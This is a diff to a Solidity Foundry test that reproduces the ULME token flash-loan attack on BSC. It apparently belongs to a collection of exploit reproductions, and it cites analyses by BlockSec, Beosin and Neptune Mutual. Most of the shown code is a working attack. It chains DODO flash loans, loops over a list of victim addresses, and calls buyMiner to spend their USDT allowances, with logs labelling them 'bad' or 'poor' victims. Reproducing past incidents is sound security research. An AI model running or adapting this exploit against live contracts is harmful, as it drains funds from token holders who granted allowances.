@@ -4,7 +4,7 @@ pragma solidity ^0.8.10;
 import "forge-std/Test.sol";
 import "./interface.sol";
 
-// @KeyInfo - Total Lost : ~200k US$ which resulted in ~50k profit
+// @KeyInfo - Total Lost : ~250k US$ which resulted in ~50k profit
 // Attacker : 0x056c20ab7e25e4dd7e49568f964d98e415da63d3
 // Attack Contract : 0x8523c7661850d0da4d86587ce9674da23369ff26
 // Vulnerable Contract : 0xAE975a25646E6eB859615d0A147B909c13D31FEd (ULME Token)
@@ -13,6 +13,7 @@ import "./interface.sol";
 // @Analysis
 // Blocksec : https://twitter.com/BlockSecTeam/status/1584839309781135361
 // Beosin: https://twitter.com/BeosinAlert/status/1584888021299916801
+// Neptune Mutual: https://medium.com/neptune-mutual/decoding-ulme-token-flash-loan-attack-56470d261787
 
 CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 IPancakePair constant ULME_BUSD_LPPool = IPancakePair(0xf18e5EC98541D073dAA0864232B9398fa183e0d4);
@@ -26,7 +27,6 @@ address constant dodo1 = 0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE;
 address constant dodo2 = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;
 
 contract Attacker is DSTest {
-    //Exploit exploit = new Exploit();
     IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
 
     uint dodo1Balance;
@@ -41,7 +41,8 @@ contract Attacker is DSTest {
         cheat.createSelectFork("bsc", 22476695);
         console.log("-------------------------------- Start Attacker ----------------------------------");
     }
-      function testExploit() external{
+
+    function testExploit() external{
 
         USDT.approve(address(pancakeRouter), type(uint).max);
         ULME.approve(address(pancakeRouter), type(uint).max);
@@ -154,7 +155,7 @@ contract Attacker is DSTest {
         victims[100]=0xC2EE820756d4074d887d762Fd8F70c4Fc47Ab47f;
 
         dodo1Balance = USDT.balanceOf(dodo1);
-        emit log_named_decimal_uint("[before 1st flashloan] borrowing from dodo1:", dodo1Balance, USDT.decimals());
+        emit log_named_decimal_uint("[before 1st flashloan] borrowing from dodo1", dodo1Balance, USDT.decimals());
         DVM(dodo1).flashLoan(0, dodo1Balance, address(this), abi.encode(victims));
 
         console.log("-------------------------------- End Exploit ----------------------------------");
@@ -165,7 +166,7 @@ contract Attacker is DSTest {
     function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{
         if(msg.sender == dodo1){
             dodo2Balance = USDT.balanceOf(dodo2);
-            emit log_named_decimal_uint("[Callback 1] borrowing from dodo2:", dodo2Balance, USDT.decimals());
+            emit log_named_decimal_uint("[Callback 1] borrowing from dodo2", dodo2Balance, USDT.decimals());
             DVM(dodo2).flashLoan(0, dodo2Balance, address(this), data);
             emit log_named_decimal_uint("[Callback 1] Attacker USDT Balance after 1st repay", USDT.balanceOf(address(this)), USDT.decimals());
             USDT.transfer(dodo1, dodo1Balance);
@@ -182,6 +183,7 @@ contract Attacker is DSTest {
 
             address[] memory victims = abi.decode(data, (address[]));
             uint numOfVictims = victims.length;
+            uint amount = 0;
             for (uint i=0; i<numOfVictims; ++i){
                 uint balance = USDT.balanceOf(address(victims[i]));
                 uint allowance = USDT.allowance(address(victims[i]), address(ULME));
@@ -189,22 +191,24 @@ contract Attacker is DSTest {
                 if (balance > allowance)
                     take = allowance;
 
-                if (take > 1)
+                if (take/1 ether > 1)
                 {
-                    emit log_named_address("mining from:", victims[i]);
-                    emit log_named_uint("available for swap:", take);
+                    emit log_named_address("mining from", victims[i]);
+                    emit log_named_decimal_uint("available for swap", take, USDT.decimals());
                     try ULME.buyMiner(victims[i],100*take/110-1)
                     {
+                        amount += take;
                     }
                     catch
                     {
-                        emit log_named_address("bad victim:", victims[i]);
+                        emit log_named_address("bad victim", victims[i]);
                     }
-                    }
+                }
                 else{
-                    emit log_named_address("poor victim:", victims[i]);
+                    emit log_named_address("poor victim", victims[i]);
                 }
             }
+            emit log_named_decimal_uint("total lost", amount, USDT.decimals());
 
             ULMEToUSDT();
 
@@ -246,4 +250,3 @@ contract Attacker is DSTest {
 interface IULME is IERC20{
     function buyMiner(address user,uint256 usdt) external returns (bool);
 }
-
